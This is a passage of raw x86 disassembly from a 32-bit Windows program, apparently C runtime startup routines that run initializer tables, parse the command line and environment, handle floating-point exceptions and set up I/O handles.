  422be6:	cmp    ecx,edi
  422be8:	mov    esi,ecx
  422bea:	jae    0x422c03
  422bec:	test   eax,eax
  422bee:	jne    0x422c2f
  422bf0:	mov    ecx,DWORD PTR [esi]
  422bf2:	test   ecx,ecx
  422bf4:	je     0x422bf8
  422bf6:	call   ecx
  422bf8:	add    esi,0x4
  422bfb:	cmp    esi,edi
  422bfd:	jb     0x422bec
  422bff:	test   eax,eax
  422c01:	jne    0x422c2f
  422c03:	push   0x4236fb
  422c08:	call   0x423b80
  422c0d:	mov    esi,0x42a000
  422c12:	mov    eax,esi
  422c14:	mov    edi,0x42a008
  422c19:	cmp    eax,edi
  422c1b:	pop    ecx
  422c1c:	jae    0x422c2d
  422c1e:	mov    eax,DWORD PTR [esi]
  422c20:	test   eax,eax
  422c22:	je     0x422c26
  422c24:	call   eax
  422c26:	add    esi,0x4
  422c29:	cmp    esi,edi
  422c2b:	jb     0x422c1e
  422c2d:	xor    eax,eax
  422c2f:	pop    edi
  422c30:	pop    esi
  422c31:	ret    
  422c32:	push   ebp
  422c33:	mov    ebp,esp
  422c35:	push   esi
  422c36:	push   edi
  422c37:	push   0x8
  422c39:	call   0x423a6f
  422c3e:	xor    esi,esi
  422c40:	inc    esi
  422c41:	cmp    DWORD PTR ds:0x45cb04,esi
  422c47:	pop    ecx
  422c48:	jne    0x422c5a
  422c4a:	push   DWORD PTR [ebp+0x8]
  422c4d:	call   DWORD PTR ds:0x428034
  422c53:	push   eax
  422c54:	call   DWORD PTR ds:0x428030
  422c5a:	cmp    DWORD PTR [ebp+0xc],0x0
  422c5e:	mov    al,BYTE PTR [ebp+0x10]
  422c61:	mov    DWORD PTR ds:0x45cb00,esi
  422c67:	mov    ds:0x45cafc,al
  422c6c:	jne    0x422cc0
  422c6e:	mov    ecx,DWORD PTR ds:0x45d268
  422c74:	test   ecx,ecx
  422c76:	je     0x422ca1
  422c78:	mov    eax,ds:0x45d264
  422c7d:	sub    eax,0x4
  422c80:	cmp    eax,ecx
  422c82:	jmp    0x422c9a
  422c84:	mov    eax,DWORD PTR [eax]
  422c86:	test   eax,eax
  422c88:	je     0x422c8c
  422c8a:	call   eax
  422c8c:	mov    eax,ds:0x45d264
  422c91:	sub    eax,0x4
  422c94:	cmp    eax,DWORD PTR ds:0x45d268
  422c9a:	mov    ds:0x45d264,eax
  422c9f:	jae    0x422c84
  422ca1:	mov    eax,0x42a01c
  422ca6:	mov    esi,0x42a020
  422cab:	cmp    eax,esi
  422cad:	mov    edi,eax
  422caf:	jae    0x422cc0
  422cb1:	mov    eax,DWORD PTR [edi]
  422cb3:	test   eax,eax
  422cb5:	je     0x422cb9
  422cb7:	call   eax
  422cb9:	add    edi,0x4
  422cbc:	cmp    edi,esi
  422cbe:	jb     0x422cb1
  422cc0:	mov    eax,0x42a024
  422cc5:	mov    esi,0x42a028
  422cca:	cmp    eax,esi
  422ccc:	mov    edi,eax
  422cce:	jae    0x422cdf
  422cd0:	mov    eax,DWORD PTR [edi]
  422cd2:	test   eax,eax
  422cd4:	je     0x422cd8
  422cd6:	call   eax
  422cd8:	add    edi,0x4
  422cdb:	cmp    edi,esi
  422cdd:	jb     0x422cd0
  422cdf:	cmp    DWORD PTR [ebp+0x10],0x0
  422ce3:	pop    edi
  422ce4:	pop    esi
  422ce5:	je     0x422cf0
  422ce7:	push   0x8
  422ce9:	call   0x4239db
  422cee:	jmp    0x422d02
  422cf0:	push   DWORD PTR [ebp+0x8]
  422cf3:	mov    DWORD PTR ds:0x45cb04,0x1
  422cfd:	call   0x422b8b
  422d02:	pop    ecx
  422d03:	pop    ebp
  422d04:	ret    
  422d05:	push   0x0
  422d07:	push   0x0
  422d09:	push   DWORD PTR [esp+0xc]
  422d0d:	call   0x422c32
  422d12:	add    esp,0xc
  422d15:	ret    
  422d16:	push   0x0
  422d18:	push   0x1
  422d1a:	push   DWORD PTR [esp+0xc]
  422d1e:	call   0x422c32
  422d23:	add    esp,0xc
  422d26:	ret    
  422d27:	push   0x1
  422d29:	push   0x0
  422d2b:	push   0x0
  422d2d:	call   0x422c32
  422d32:	add    esp,0xc
  422d35:	ret    
  422d36:	push   0x1
  422d38:	push   0x1
  422d3a:	push   0x0
  422d3c:	call   0x422c32
  422d41:	add    esp,0xc
  422d44:	ret    
  422d45:	push   ebp
  422d46:	mov    ebp,esp
  422d48:	sub    esp,0x10c
  422d4e:	mov    eax,ds:0x45c430
  422d53:	xor    eax,DWORD PTR [ebp+0x4]
  422d56:	mov    ecx,DWORD PTR [ebp+0x8]
  422d59:	push   ebx
  422d5a:	push   esi
  422d5b:	mov    DWORD PTR [ebp-0x4],eax
  422d5e:	xor    edx,edx
  422d60:	push   edi
  422d61:	xor    eax,eax
  422d63:	cmp    ecx,DWORD PTR [eax*8+0x45c1c8]
  422d6a:	je     0x422d72
  422d6c:	inc    eax
  422d6d:	cmp    eax,0x12
  422d70:	jb     0x422d63
  422d72:	mov    esi,eax
  422d74:	shl    esi,0x3
  422d77:	cmp    ecx,DWORD PTR [esi+0x45c1c8]
  422d7d:	jne    0x422ea6
  422d83:	mov    eax,ds:0x45cabc
  422d88:	cmp    eax,0x1
  422d8b:	je     0x422e81
  422d91:	cmp    eax,edx
  422d93:	jne    0x422da2
  422d95:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422d9c:	je     0x422e81
  422da2:	cmp    ecx,0xfc
  422da8:	je     0x422ea6
  422dae:	push   0x104
  422db3:	lea    eax,[ebp-0x10c]
  422db9:	push   eax
  422dba:	push   edx
  422dbb:	mov    BYTE PTR [ebp-0x8],dl
  422dbe:	call   DWORD PTR ds:0x428040
  422dc4:	test   eax,eax
  422dc6:	jne    0x422ddb
  422dc8:	lea    eax,[ebp-0x10c]
  422dce:	push   0x42848c
  422dd3:	push   eax
  422dd4:	call   0x423c90
  422dd9:	pop    ecx
  422dda:	pop    ecx
  422ddb:	lea    eax,[ebp-0x10c]
  422de1:	push   eax
  422de2:	lea    edi,[ebp-0x10c]
  422de8:	call   0x423ec0
  422ded:	inc    eax
  422dee:	cmp    eax,0x3c
  422df1:	pop    ecx
  422df2:	jbe    0x422e1d
  422df4:	lea    eax,[ebp-0x10c]
  422dfa:	push   eax
  422dfb:	call   0x423ec0
  422e00:	mov    edi,eax
  422e02:	lea    eax,[ebp-0x10c]
  422e08:	sub    eax,0x3b
  422e0b:	push   0x3
  422e0d:	add    edi,eax
  422e0f:	push   0x428488
  422e14:	push   edi
  422e15:	call   0x423d90
  422e1a:	add    esp,0x10
  422e1d:	push   edi
  422e1e:	call   0x423ec0
  422e23:	push   DWORD PTR [esi+0x45c1cc]
  422e29:	mov    ebx,eax
  422e2b:	call   0x423ec0
  422e30:	lea    eax,[ebx+eax*1+0x1c]
  422e34:	pop    ecx
  422e35:	add    eax,0x3
  422e38:	pop    ecx
  422e39:	and    eax,0xfffffffc
  422e3c:	call   0x423900
  422e41:	mov    ebx,esp
  422e43:	push   0x42846c
  422e48:	push   ebx
  422e49:	call   0x423c90
  422e4e:	push   edi
  422e4f:	push   ebx
  422e50:	call   0x423ca0
  422e55:	push   0x428468
  422e5a:	push   ebx
  422e5b:	call   0x423ca0
  422e60:	push   DWORD PTR [esi+0x45c1cc]
  422e66:	push   ebx
  422e67:	call   0x423ca0
  422e6c:	push   0x12010
  422e71:	push   0x428440
  422e76:	push   ebx
  422e77:	call   0x423b92
  422e7c:	add    esp,0x2c
  422e7f:	jmp    0x422ea6
  422e81:	push   edx
  422e82:	lea    eax,[ebp+0x8]
  422e85:	push   eax
  422e86:	lea    esi,[esi+0x45c1cc]
  422e8c:	push   DWORD PTR [esi]
  422e8e:	call   0x423ec0
  422e93:	pop    ecx
  422e94:	push   eax
  422e95:	push   DWORD PTR [esi]
  422e97:	push   0xfffffff4
  422e99:	call   DWORD PTR ds:0x42803c
  422e9f:	push   eax
  422ea0:	call   DWORD PTR ds:0x428038
  422ea6:	lea    esp,[ebp-0x118]
  422eac:	mov    ecx,DWORD PTR [ebp-0x4]
  422eaf:	xor    ecx,DWORD PTR [ebp+0x4]
  422eb2:	call   0x423f7c
  422eb7:	pop    edi
  422eb8:	pop    esi
  422eb9:	pop    ebx
  422eba:	leave  
  422ebb:	ret    
  422ebc:	mov    eax,ds:0x45cabc
  422ec1:	cmp    eax,0x1
  422ec4:	je     0x422ed3
  422ec6:	test   eax,eax
  422ec8:	jne    0x422ef4
  422eca:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422ed1:	jne    0x422ef4
  422ed3:	push   0xfc
  422ed8:	call   0x422d45
  422edd:	mov    eax,ds:0x45cb08
  422ee2:	test   eax,eax
  422ee4:	pop    ecx
  422ee5:	je     0x422ee9
  422ee7:	call   eax
  422ee9:	push   0xff
  422eee:	call   0x422d45
  422ef3:	pop    ecx
  422ef4:	ret    
  422ef5:	push   ebp
  422ef6:	mov    ebp,esp
  422ef8:	push   ecx
  422ef9:	push   ebx
  422efa:	push   esi
  422efb:	push   edi
  422efc:	call   0x42375d
  422f01:	mov    edi,DWORD PTR [ebp+0x8]
  422f04:	mov    esi,eax
  422f06:	mov    edx,DWORD PTR [esi+0x54]
  422f09:	mov    eax,ds:0x45c2dc
  422f0e:	mov    ecx,edx
  422f10:	cmp    DWORD PTR [ecx],edi
  422f12:	je     0x422f21
  422f14:	lea    ebx,[eax+eax*2]
  422f17:	add    ecx,0xc
  422f1a:	lea    ebx,[edx+ebx*4]
  422f1d:	cmp    ecx,ebx
  422f1f:	jb     0x422f10
  422f21:	lea    eax,[eax+eax*2]
  422f24:	lea    eax,[edx+eax*4]
  422f27:	cmp    ecx,eax
  422f29:	jae    0x422f2f
  422f2b:	cmp    DWORD PTR [ecx],edi
  422f2d:	je     0x422f31
  422f2f:	xor    ecx,ecx
  422f31:	test   ecx,ecx
  422f33:	je     0x42304b
  422f39:	mov    ebx,DWORD PTR [ecx+0x8]
  422f3c:	test   ebx,ebx
  422f3e:	mov    DWORD PTR [ebp+0x8],ebx
  422f41:	je     0x42304b
  422f47:	cmp    ebx,0x5
  422f4a:	jne    0x422f58
  422f4c:	and    DWORD PTR [ecx+0x8],0x0
  422f50:	xor    eax,eax
  422f52:	inc    eax
  422f53:	jmp    0x423054
  422f58:	cmp    ebx,0x1
  422f5b:	je     0x423046
  422f61:	mov    eax,DWORD PTR [esi+0x58]
  422f64:	mov    DWORD PTR [ebp-0x4],eax
  422f67:	mov    eax,DWORD PTR [ebp+0xc]
  422f6a:	mov    DWORD PTR [esi+0x58],eax
  422f6d:	mov    eax,DWORD PTR [ecx+0x4]
  422f70:	cmp    eax,0x8
  422f73:	jne    0x423038
  422f79:	mov    edx,DWORD PTR ds:0x45c2d0
  422f7f:	mov    eax,ds:0x45c2d4
  422f84:	add    eax,edx
  422f86:	cmp    edx,eax
  422f88:	jge    0x422fb1
  422f8a:	lea    eax,[edx+edx*2]
  422f8d:	shl    eax,0x2
  422f90:	mov    edi,DWORD PTR [esi+0x54]
  422f93:	and    DWORD PTR [eax+edi*1+0x8],0x0
  422f98:	mov    edi,DWORD PTR ds:0x45c2d0
  422f9e:	mov    ebx,DWORD PTR ds:0x45c2d4
  422fa4:	inc    edx
  422fa5:	add    ebx,edi
  422fa7:	add    eax,0xc
  422faa:	cmp    edx,ebx
  422fac:	jl     0x422f90
  422fae:	mov    ebx,DWORD PTR [ebp+0x8]
  422fb1:	mov    ecx,DWORD PTR [ecx]
  422fb3:	cmp    ecx,0xc000008e
  422fb9:	mov    edi,DWORD PTR [esi+0x5c]
  422fbc:	jne    0x422fc7
  422fbe:	mov    DWORD PTR [esi+0x5c],0x83
  422fc5:	jmp    0x42302b
  422fc7:	cmp    ecx,0xc0000090
  422fcd:	jne    0x422fd8
  422fcf:	mov    DWORD PTR [esi+0x5c],0x81
  422fd6:	jmp    0x42302b
  422fd8:	cmp    ecx,0xc0000091
  422fde:	jne    0x422fe9
  422fe0:	mov    DWORD PTR [esi+0x5c],0x84
  422fe7:	jmp    0x42302b
  422fe9:	cmp    ecx,0xc0000093
  422fef:	jne    0x422ffa
  422ff1:	mov    DWORD PTR [esi+0x5c],0x85
  422ff8:	jmp    0x42302b
  422ffa:	cmp    ecx,0xc000008d
  423000:	jne    0x42300b
  423002:	mov    DWORD PTR [esi+0x5c],0x82
  423009:	jmp    0x42302b
  42300b:	cmp    ecx,0xc000008f
  423011:	jne    0x42301c
  423013:	mov    DWORD PTR [esi+0x5c],0x86
  42301a:	jmp    0x42302b
  42301c:	cmp    ecx,0xc0000092
  423022:	jne    0x42302b
  423024:	mov    DWORD PTR [esi+0x5c],0x8a
  42302b:	push   DWORD PTR [esi+0x5c]
  42302e:	push   0x8
  423030:	call   ebx
  423032:	pop    ecx
  423033:	mov    DWORD PTR [esi+0x5c],edi
  423036:	jmp    0x42303f
  423038:	and    DWORD PTR [ecx+0x8],0x0
  42303c:	push   eax
  42303d:	call   ebx
  42303f:	mov    eax,DWORD PTR [ebp-0x4]
  423042:	pop    ecx
  423043:	mov    DWORD PTR [esi+0x58],eax
  423046:	or     eax,0xffffffff
  423049:	jmp    0x423054
  42304b:	push   DWORD PTR [ebp+0xc]
  42304e:	call   DWORD PTR ds:0x428044
  423054:	pop    edi
  423055:	pop    esi
  423056:	pop    ebx
  423057:	leave  
  423058:	ret    
  423059:	cmp    DWORD PTR ds:0x45d26c,0x0
  423060:	jne    0x423067
  423062:	call   0x42449c
  423067:	push   esi
  423068:	mov    esi,DWORD PTR ds:0x45d274
  42306e:	test   esi,esi
  423070:	jne    0x423079
  423072:	mov    esi,0x4284a3
  423077:	jmp    0x4230be
  423079:	mov    al,BYTE PTR [esi]
  42307b:	cmp    al,0x22
  42307d:	jne    0x4230a7
  42307f:	inc    esi
  423080:	mov    al,BYTE PTR [esi]
  423082:	cmp    al,0x22
  423084:	je     0x4230b7
  423086:	test   al,al
  423088:	je     0x4230a0
  42308a:	movzx  eax,al
  42308d:	push   eax
  42308e:	call   0x423fbb
  423093:	test   eax,eax
  423095:	pop    ecx
  423096:	je     0x423099
  423098:	inc    esi
  423099:	inc    esi
  42309a:	mov    al,BYTE PTR [esi]
  42309c:	cmp    al,0x22
  42309e:	jne    0x423086
  4230a0:	cmp    BYTE PTR [esi],0x22
  4230a3:	jne    0x4230b8
  4230a5:	jmp    0x4230b7
  4230a7:	cmp    al,0x20
  4230a9:	jbe    0x4230b8
  4230ab:	inc    esi
  4230ac:	cmp    BYTE PTR [esi],0x20
  4230af:	ja     0x4230ab
  4230b1:	jmp    0x4230b8
  4230b3:	cmp    al,0x20
  4230b5:	ja     0x4230be
  4230b7:	inc    esi
  4230b8:	mov    al,BYTE PTR [esi]
  4230ba:	test   al,al
  4230bc:	jne    0x4230b3
  4230be:	mov    eax,esi
  4230c0:	pop    esi
  4230c1:	ret    
  4230c2:	push   ebx
  4230c3:	xor    ebx,ebx
  4230c5:	cmp    DWORD PTR ds:0x45d26c,ebx
  4230cb:	push   esi
  4230cc:	push   edi
  4230cd:	jne    0x4230d4
  4230cf:	call   0x42449c
  4230d4:	mov    esi,DWORD PTR ds:0x45cab4
  4230da:	xor    edi,edi
  4230dc:	cmp    esi,ebx
  4230de:	jne    0x4230f2
  4230e0:	jmp    0x423112
  4230e2:	cmp    al,0x3d
  4230e4:	je     0x4230e7
  4230e6:	inc    edi
  4230e7:	push   esi
  4230e8:	call   0x423ec0
  4230ed:	pop    ecx
  4230ee:	lea    esi,[esi+eax*1+0x1]
  4230f2:	mov    al,BYTE PTR [esi]
  4230f4:	cmp    al,bl
  4230f6:	jne    0x4230e2
  4230f8:	lea    eax,[edi*4+0x4]
  4230ff:	push   eax
  423100:	call   0x4245d2
  423105:	mov    edi,eax
  423107:	cmp    edi,ebx
  423109:	pop    ecx
  42310a:	mov    DWORD PTR ds:0x45cae4,edi
  423110:	jne    0x423117
  423112:	or     eax,0xffffffff
  423115:	jmp    0x42316f
  423117:	mov    esi,DWORD PTR ds:0x45cab4
  42311d:	push   ebp
  42311e:	jmp    0x42314a
  423120:	push   esi
  423121:	call   0x423ec0
  423126:	mov    ebp,eax
  423128:	inc    ebp
  423129:	cmp    BYTE PTR [esi],0x3d
  42312c:	pop    ecx
  42312d:	je     0x423148
  42312f:	push   ebp
  423130:	call   0x4245d2
  423135:	cmp    eax,ebx
  423137:	pop    ecx
  423138:	mov    DWORD PTR [edi],eax
  42313a:	je     0x423173
  42313c:	push   esi
  42313d:	push   eax
  42313e:	call   0x423c90
  423143:	pop    ecx
  423144:	pop    ecx
  423145:	add    edi,0x4
  423148:	add    esi,ebp
  42314a:	cmp    BYTE PTR [esi],bl
  42314c:	jne    0x423120
  42314e:	push   DWORD PTR ds:0x45cab4
  423154:	call   0x4244ba
  423159:	mov    DWORD PTR ds:0x45cab4,ebx
  42315f:	mov    DWORD PTR [edi],ebx
  423161:	mov    DWORD PTR ds:0x45d260,0x1
  42316b:	xor    eax,eax
  42316d:	pop    ecx
  42316e:	pop    ebp
  42316f:	pop    edi
  423170:	pop    esi
  423171:	pop    ebx
  423172:	ret    
  423173:	push   DWORD PTR ds:0x45cae4
  423179:	call   0x4244ba
  42317e:	mov    DWORD PTR ds:0x45cae4,ebx
  423184:	or     eax,0xffffffff
  423187:	jmp    0x42316d
  423189:	push   ebp
  42318a:	mov    ebp,esp
  42318c:	push   ecx
  42318d:	push   ebx
  42318e:	mov    ebx,DWORD PTR [ebp+0xc]
  423191:	xor    edx,edx
  423193:	cmp    DWORD PTR [ebp+0x8],edx
  423196:	push   edi
  423197:	mov    DWORD PTR [esi],edx
  423199:	mov    edi,ecx
  42319b:	mov    DWORD PTR [ebx],0x1
  4231a1:	je     0x4231ac
  4231a3:	mov    ecx,DWORD PTR [ebp+0x8]
  4231a6:	add    DWORD PTR [ebp+0x8],0x4
  4231aa:	mov    DWORD PTR [ecx],edi
  4231ac:	cmp    BYTE PTR [eax],0x22
  4231af:	jne    0x4231bf
  4231b1:	xor    ecx,ecx
  4231b3:	test   edx,edx
  4231b5:	sete   cl
  4231b8:	inc    eax
  4231b9:	mov    edx,ecx
  4231bb:	mov    cl,0x22
  4231bd:	jmp    0x4231ec
  4231bf:	inc    DWORD PTR [esi]
  4231c1:	test   edi,edi
  4231c3:	je     0x4231ca
  4231c5:	mov    cl,BYTE PTR [eax]
  4231c7:	mov    BYTE PTR [edi],cl
  4231c9:	inc    edi
  4231ca:	mov    cl,BYTE PTR [eax]
  4231cc:	movzx  ebx,cl
  4231cf:	inc    eax
  4231d0:	test   BYTE PTR [ebx+0x45cf21],0x4
  4231d7:	je     0x4231e5
  4231d9:	inc    DWORD PTR [esi]
  4231db:	test   edi,edi
  4231dd:	je     0x4231e4
  4231df:	mov    bl,BYTE PTR [eax]
  4231e1:	mov    BYTE PTR [edi],bl
  4231e3:	inc    edi
  4231e4:	inc    eax
  4231e5:	test   cl,cl
  4231e7:	mov    ebx,DWORD PTR [ebp+0xc]
  4231ea:	je     0x42321e
  4231ec:	test   edx,edx
  4231ee:	jne    0x4231ac
  4231f0:	cmp    cl,0x20
  4231f3:	je     0x4231fa
  4231f5:	cmp    cl,0x9
  4231f8:	jne    0x4231ac
  4231fa:	test   edi,edi
  4231fc:	je     0x423202
  4231fe:	and    BYTE PTR [edi-0x1],0x0
  423202:	and    DWORD PTR [ebp-0x4],0x0
  423206:	cmp    BYTE PTR [eax],0x0
  423209:	je     0x4232e5
  42320f:	mov    cl,BYTE PTR [eax]
  423211:	cmp    cl,0x20
  423214:	je     0x42321b
  423216:	cmp    cl,0x9
  423219:	jne    0x423221
  42321b:	inc    eax
  42321c:	jmp    0x42320f
  42321e:	dec    eax
  42321f:	jmp    0x423202
  423221:	cmp    BYTE PTR [eax],0x0
  423224:	je     0x4232e5
  42322a:	cmp    DWORD PTR [ebp+0x8],0x0
  42322e:	je     0x423239
  423230:	mov    ecx,DWORD PTR [ebp+0x8]
  423233:	add    DWORD PTR [ebp+0x8],0x4
  423237:	mov    DWORD PTR [ecx],edi
  423239:	inc    DWORD PTR [ebx]
  42323b:	xor    ebx,ebx
  42323d:	inc    ebx
  42323e:	xor    edx,edx
  423240:	jmp    0x423244
  423242:	inc    eax
  423243:	inc    edx
  423244:	cmp    BYTE PTR [eax],0x5c
  423247:	je     0x423242
  423249:	cmp    BYTE PTR [eax],0x22
  42324c:	jne    0x423274
  42324e:	test   dl,0x1
  423251:	jne    0x423272
  423253:	cmp    DWORD PTR [ebp-0x4],0x0
  423257:	je     0x423265
  423259:	lea    ecx,[eax+0x1]
  42325c:	cmp    BYTE PTR [ecx],0x22
  42325f:	jne    0x423265
  423261:	mov    eax,ecx
  423263:	jmp    0x423267
  423265:	xor    ebx,ebx
  423267:	xor    ecx,ecx
  423269:	cmp    DWORD PTR [ebp-0x4],ecx
  42326c:	sete   cl
  42326f:	mov    DWORD PTR [ebp-0x4],ecx
  423272:	shr    edx,1
  423274:	test   edx,edx
  423276:	je     0x423285
  423278:	test   edi,edi
  42327a:	je     0x423280
  42327c:	mov    BYTE PTR [edi],0x5c
  42327f:	inc    edi
  423280:	inc    DWORD PTR [esi]
  423282:	dec    edx
  423283:	jne    0x423278
  423285:	mov    cl,BYTE PTR [eax]
  423287:	test   cl,cl
  423289:	je     0x4232d3
  42328b:	cmp    DWORD PTR [ebp-0x4],0x0
  42328f:	jne    0x42329b
  423291:	cmp    cl,0x20
  423294:	je     0x4232d3
  423296:	cmp    cl,0x9
  423299:	je     0x4232d3
  42329b:	test   ebx,ebx
  42329d:	je     0x4232cd
  42329f:	test   edi,edi
  4232a1:	je     0x4232bc
  4232a3:	movzx  edx,cl
  4232a6:	test   BYTE PTR [edx+0x45cf21],0x4
  4232ad:	je     0x4232b5
  4232af:	mov    BYTE PTR [edi],cl
  4232b1:	inc    edi
  4232b2:	inc    eax
  4232b3:	inc    DWORD PTR [esi]
  4232b5:	mov    cl,BYTE PTR [eax]
  4232b7:	mov    BYTE PTR [edi],cl
  4232b9:	inc    edi
  4232ba:	jmp    0x4232cb
  4232bc:	movzx  ecx,cl
  4232bf:	test   BYTE PTR [ecx+0x45cf21],0x4
  4232c6:	je     0x4232cb
  4232c8:	inc    eax
  4232c9:	inc    DWORD PTR [esi]
  4232cb:	inc    DWORD PTR [esi]
  4232cd:	inc    eax
  4232ce:	jmp    0x42323b
  4232d3:	test   edi,edi
  4232d5:	je     0x4232db
  4232d7:	and    BYTE PTR [edi],0x0
  4232da:	inc    edi
  4232db:	inc    DWORD PTR [esi]
  4232dd:	mov    ebx,DWORD PTR [ebp+0xc]
  4232e0:	jmp    0x423206
  4232e5:	mov    eax,DWORD PTR [ebp+0x8]
  4232e8:	test   eax,eax
  4232ea:	je     0x4232ef
  4232ec:	and    DWORD PTR [eax],0x0
  4232ef:	inc    DWORD PTR [ebx]
  4232f1:	pop    edi
  4232f2:	pop    ebx
  4232f3:	leave  
  4232f4:	ret    
  4232f5:	push   ebp
  4232f6:	mov    ebp,esp
  4232f8:	push   ecx
  4232f9:	push   ecx
  4232fa:	push   ebx
  4232fb:	push   esi
  4232fc:	push   edi
  4232fd:	xor    edi,edi
  4232ff:	cmp    DWORD PTR ds:0x45d26c,edi
  423305:	jne    0x42330c
  423307:	call   0x42449c
  42330c:	and    BYTE PTR ds:0x45cc14,0x0
  423313:	push   0x104
  423318:	mov    esi,0x45cb10
  42331d:	push   esi
  42331e:	push   edi
  42331f:	call   DWORD PTR ds:0x428040
  423325:	mov    eax,ds:0x45d274
  42332a:	cmp    eax,edi
  42332c:	mov    DWORD PTR ds:0x45caf4,esi
  423332:	je     0x42333b
  423334:	cmp    BYTE PTR [eax],0x0
  423337:	mov    ebx,eax
  423339:	jne    0x42333d
  42333b:	mov    ebx,esi
  42333d:	lea    eax,[ebp-0x4]
  423340:	push   eax
  423341:	push   edi
  423342:	lea    esi,[ebp-0x8]
  423345:	xor    ecx,ecx
  423347:	mov    eax,ebx
  423349:	call   0x423189
  42334e:	mov    esi,DWORD PTR [ebp-0x4]
  423351:	mov    eax,DWORD PTR [ebp-0x8]
  423354:	shl    esi,0x2
  423357:	add    eax,esi
  423359:	push   eax
  42335a:	call   0x4245d2
  42335f:	mov    edi,eax
  423361:	add    esp,0xc
  423364:	test   edi,edi
  423366:	jne    0x42336d
  423368:	or     eax,0xffffffff
  42336b:	jmp    0x423392
  42336d:	lea    eax,[ebp-0x4]
  423370:	push   eax
  423371:	lea    ecx,[esi+edi*1]
  423374:	push   edi
  423375:	lea    esi,[ebp-0x8]
  423378:	mov    eax,ebx
  42337a:	call   0x423189
  42337f:	mov    eax,DWORD PTR [ebp-0x4]
  423382:	dec    eax
  423383:	pop    ecx
  423384:	mov    ds:0x45cad8,eax
  423389:	pop    ecx
  42338a:	mov    DWORD PTR ds:0x45cadc,edi
  423390:	xor    eax,eax
  423392:	pop    edi
  423393:	pop    esi
  423394:	pop    ebx
  423395:	leave  
  423396:	ret    
  423397:	push   ecx
  423398:	push   ecx
  423399:	mov    eax,ds:0x45cc18
  42339e:	push   ebx
  42339f:	push   ebp
  4233a0:	push   esi
  4233a1:	push   edi
  4233a2:	mov    edi,DWORD PTR ds:0x428058
  4233a8:	xor    ebx,ebx
  4233aa:	xor    esi,esi
  4233ac:	cmp    eax,ebx
  4233ae:	push   0x2
  4233b0:	pop    ebp
  4233b1:	jne    0x4233e0
  4233b3:	call   edi
  4233b5:	mov    esi,eax
  4233b7:	cmp    esi,ebx
  4233b9:	je     0x4233c7
  4233bb:	mov    DWORD PTR ds:0x45cc18,0x1
  4233c5:	jmp    0x4233e5
  4233c7:	call   DWORD PTR ds:0x428014
  4233cd:	cmp    eax,0x78
  4233d0:	jne    0x4233db
  4233d2:	mov    eax,ebp
  4233d4:	mov    ds:0x45cc18,eax
  4233d9:	jmp    0x4233e0
  4233db:	mov    eax,ds:0x45cc18
  4233e0:	cmp    eax,0x1
  4233e3:	jne    0x423462
  4233e5:	cmp    esi,ebx
  4233e7:	jne    0x4233f1
  4233e9:	call   edi
  4233eb:	mov    esi,eax
  4233ed:	cmp    esi,ebx
  4233ef:	je     0x42346a
  4233f1:	cmp    WORD PTR [esi],bx
  4233f4:	mov    eax,esi
  4233f6:	je     0x423406
  4233f8:	add    eax,ebp
  4233fa:	cmp    WORD PTR [eax],bx
  4233fd:	jne    0x4233f8
  4233ff:	add    eax,ebp
  423401:	cmp    WORD PTR [eax],bx
  423404:	jne    0x4233f8
  423406:	mov    edi,DWORD PTR ds:0x428054
  42340c:	push   ebx
  42340d:	push   ebx
  42340e:	push   ebx
  42340f:	sub    eax,esi
  423411:	push   ebx
  423412:	sar    eax,1
  423414:	inc    eax
  423415:	push   eax
  423416:	push   esi
  423417:	push   ebx
  423418:	push   ebx
  423419:	mov    DWORD PTR [esp+0x34],eax
  42341d:	call   edi
  42341f:	mov    ebp,eax
  423421:	cmp    ebp,ebx
  423423:	je     0x423457
  423425:	push   ebp
  423426:	call   0x4245d2
  42342b:	cmp    eax,ebx
  42342d:	pop    ecx
  42342e:	mov    DWORD PTR [esp+0x10],eax
  423432:	je     0x423457
  423434:	push   ebx
  423435:	push   ebx
  423436:	push   ebp
  423437:	push   eax
  423438:	push   DWORD PTR [esp+0x24]
  42343c:	push   esi
  42343d:	push   ebx
  42343e:	push   ebx
  42343f:	call   edi
  423441:	test   eax,eax
  423443:	jne    0x423453
  423445:	push   DWORD PTR [esp+0x10]
  423449:	call   0x4244ba
  42344e:	pop    ecx
  42344f:	mov    DWORD PTR [esp+0x10],ebx
  423453:	mov    ebx,DWORD PTR [esp+0x10]
  423457:	push   esi
  423458:	call   DWORD PTR ds:0x428050
  42345e:	mov    eax,ebx
  423460:	jmp    0x4234b2
  423462:	cmp    eax,ebp
  423464:	je     0x42346e
  423466:	cmp    eax,ebx
  423468:	je     0x42346e
  42346a:	xor    eax,eax
  42346c:	jmp    0x4234b2
  42346e:	call   DWORD PTR ds:0x42804c
  423474:	mov    esi,eax
  423476:	cmp    esi,ebx
  423478:	je     0x42346a
  42347a:	cmp    BYTE PTR [esi],bl
  42347c:	je     0x423488
  42347e:	inc    eax
  42347f:	cmp    BYTE PTR [eax],bl
  423481:	jne    0x42347e
  423483:	inc    eax
  423484:	cmp    BYTE PTR [eax],bl
  423486:	jne    0x42347e
  423488:	sub    eax,esi
  42348a:	inc    eax
  42348b:	mov    ebp,eax
  42348d:	push   ebp
  42348e:	call   0x4245d2
  423493:	mov    edi,eax
  423495:	cmp    edi,ebx
  423497:	pop    ecx
  423498:	jne    0x42349e
  42349a:	xor    edi,edi
  42349c:	jmp    0x4234a9
  42349e:	push   ebp
  42349f:	push   esi
  4234a0:	push   edi
  4234a1:	call   0x4245f0
  4234a6:	add    esp,0xc
  4234a9:	push   esi
  4234aa:	call   DWORD PTR ds:0x428048
  4234b0:	mov    eax,edi
  4234b2:	pop    edi
  4234b3:	pop    esi
  4234b4:	pop    ebp
  4234b5:	pop    ebx
  4234b6:	pop    ecx
  4234b7:	pop    ecx
  4234b8:	ret    
  4234b9:	sub    esp,0x48
  4234bc:	push   ebx
  4234bd:	mov    ebx,0x480
  4234c2:	push   ebx
  4234c3:	call   0x4245d2
  4234c8:	test   eax,eax
  4234ca:	pop    ecx
  4234cb:	jne    0x4234d5
  4234cd:	or     eax,0xffffffff
  4234d0:	jmp    0x4236b2
  4234d5:	mov    ds:0x45d160,eax
  4234da:	mov    DWORD PTR ds:0x45d148,0x20
  4234e4:	lea    ecx,[eax+0x480]
  4234ea:	jmp    0x42350a
  4234ec:	and    BYTE PTR [eax+0x4],0x0
  4234f0:	or     DWORD PTR [eax],0xffffffff
  4234f3:	and    DWORD PTR [eax+0x8],0x0
  4234f7:	mov    BYTE PTR [eax+0x5],0xa
  4234fb:	mov    ecx,DWORD PTR ds:0x45d160
  423501:	add    eax,0x24
